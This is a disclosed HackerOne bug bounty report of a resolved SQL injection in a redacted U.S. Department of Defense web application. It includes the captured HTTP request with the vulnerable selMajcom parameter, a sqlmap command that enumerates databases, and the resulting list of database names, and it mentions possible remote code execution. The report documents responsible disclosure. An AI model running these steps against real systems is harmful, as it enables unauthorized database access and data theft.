---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2023-01-06
submitted: 2022-07-06T16:07:29.133Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "haxor31337"
source: "https://hackerone.com/reports/1628408"
title: "SQL Injection at https://████████.asp (█████████) [selMajcom] [HtUS]"
---
# SQL Injection at https://████████.asp (█████████) [selMajcom] [HtUS]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2023-01-06

- Report: [https://hackerone.com/reports/1628408](https://hackerone.com/reports/1628408)
- CWE: SQL Injection
- Submitted: 2022-07-06T16:07:29.133Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
SQL injection (SQLi) is a vulnerability in which an application accepts input into an SQL statement and treats this input as part of the statement. Typically, SQLi allows a malicious attacker to view, modify or delete data that should not be able to be retrieved. An SQLi vulnerability was found for this host which allows an attacker to execute code and view data from the SQL service by submitting SQL queries.

An attacker could exploit this lack of input sanitization to exfiltrate database data and files, tamper with the data, or perform resource exhaustion. Depending on the database and how it is configured, an attacker could potentially remotely execute code on the server running the database.

I found SQL Injection at https://█████████.asp allowing attacker can exfiltrate database and leak sensitive data of ███████ without authentication.

## Steps To Reproduce:
1. Access to https://████.asp 
Create an user, after create go to https://████.asp
2. Capture request on burpsuite with the following request

```
GET /█████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ██████████.████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
Inject SQL query to vulnerable parameter **selMajcom**

Save request to file dod.txt

```
GET /██████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ███.██████████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close

```
Attack automation with sqlmap command

```
python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3
```

## Supporting Material/References:
█████

```
available databases [24]:
[*] ActivityManager
[*] AFMajcomBases
[*] AFNAF
[*] AFServicesUsers
[*] AFSponsorship
[*] AssetsAndLiabilities
[*] BaseProjects
[*] BEFT
[*] CGO
[*] EICSQL
[*] master
[*] model
[*] msdb
[*] NAFDIS
[*] NAFRIS_restore
[*] ORCA
[*] Property
[*] RMD
[*] ██████████
[*] tempdb
[*] TSD
[*] Unemployment
[*] VMS_Test
[*] W2DATA
```

## Impact

Data exfiltration through a SQLi attack could lead to reputational damage or regulatory fines for the business due to an attacker’s unauthorized access to data. This could also result in reputational damage for the business through the impact to customers’ trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.
Leak sensitive data on █████████ service.

## Timeline

- **Report Filed**
- **2022-07-06** @haxor31337: The current user database is **AFSV\\████████SQLSERVICE'** with DBA permission so the attacker potential RCE server. But I will stop at this step.
If you need I to demo the RCE attack let me know.
██████

Best Regards,
haxor
- **2022-07-07** @h1_analyst_andrew: Hi @haxor31337,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@retina
- **Report Needs More Info**
- **Report New**
- **2022-07-08** @haxor31337: Hi @retina 
Can you reach out to the DoD team to confirm this issue?

Best Regards,
haxor
- **2022-07-11** @haxor31337: Any update on my report?

Regards,
haxor
- **Report Pending Program Review**
- **Report Triaged**
- **2022-07-20** @haxor31337: Hi,
Can I get a reward for this finding? I reported at the time of the event but due to slow triage, my report got triaged slow.
Please consider it.

Best Regards,
haxor
- **2022-07-28** @nutellatte: Hi @haxor31337 

Due to a large volume of submissions during the Hack U.S. Challenge, your submission fell through the cracks and was later identified as valid and eligible for bounty award. HackerOne has awarded you for it in the backend. 

Thank you again for your time on this challenge and apologies for the delay.
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
